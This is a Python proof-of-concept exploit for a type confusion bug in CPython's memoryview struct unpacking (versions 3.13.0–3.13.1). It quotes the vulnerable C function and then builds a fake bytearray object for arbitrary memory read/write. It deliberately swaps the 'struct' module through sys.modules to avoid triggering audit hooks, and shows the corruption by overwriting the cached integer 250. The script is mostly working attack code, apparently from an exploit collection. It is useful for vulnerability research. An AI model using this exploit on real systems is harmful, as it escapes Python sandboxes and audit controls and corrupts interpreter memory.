"""
Author: @Nico-Posada
Bug Credits: @Nico-Posada
"""

# TLDR: Abuse how the return value of function we can control is assumed to be a tuple without doing any checks
# Tested to work on 3.13.0, 3.13.1
# (should work on 3.14, but tuple struct changed so the exploit needs to be modified)

# Here is the vulnerable code as of 3.14.0
# https://github.com/python/cpython/blob/v3.14.0/Objects/memoryobject.c#L2131-L2148
"""
static PyObject *
struct_unpack_single(const char *ptr, struct unpacker *x)
{
    PyObject *v;

    memcpy(x->item, ptr, x->itemsize);
    v = PyObject_CallOneArg(x->unpack_from, x->mview); // <--- function we can control
    if (v == NULL)
        return NULL;

    if (PyTuple_GET_SIZE(v) == 1) { // <--- assumes return value is a tuple without any prior checks
        PyObject *res = Py_NewRef(PyTuple_GET_ITEM(v, 0));
        Py_DECREF(v);
        return res;
    }

    return v;
}
"""

from common import evil_bytearray_obj, PYVER, i2f

# TODO: write exploit for versions >=3.14, raise an error until then
if PYVER >= (3, 14, 0):
    raise NotImplementedError("Changes were made to the tuple struct that makes this exploit not work on versions >=3.14")

# This one's a pretty standard type confusion bug. We just return a non-tuple type that has a fake bytearray
# object pointer where tuple[0] would normally be to win. 

class Evil:
    def __init__(self, fmt):
        # this class wont work without an init func explicity defined
        pass

    def __eq__(self, other):
        global mem
        mem = other
        return False

    def unpack_from(self, mem):
        global first, fake_obj

        if first:
            # see ./common/common.py for evil bytearray obj explanation
            fake_obj, obj_addr = evil_bytearray_obj()

            real, imag = i2f(1), i2f(obj_addr)
            first = False
            
            return complex(real, imag)
        else:
            return (self,)

# super jank but is safe from triggering any audit hooks
# (as long as sys.modules wasn't cleared before)
import sys
x = lambda: ...
x.Struct = Evil
sys.modules['struct'] = x

# can do the same thing by just doing
"""
import struct
struct.Struct = Evil
"""
# but will likely trigger audit hook

buf = b"epic buffer obj"
a = memoryview(buf).cast('b')
b = memoryview(buf).cast('B')
first = True

mem = None
a == b # trigger bug
if mem is None:
    exit("failed")

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100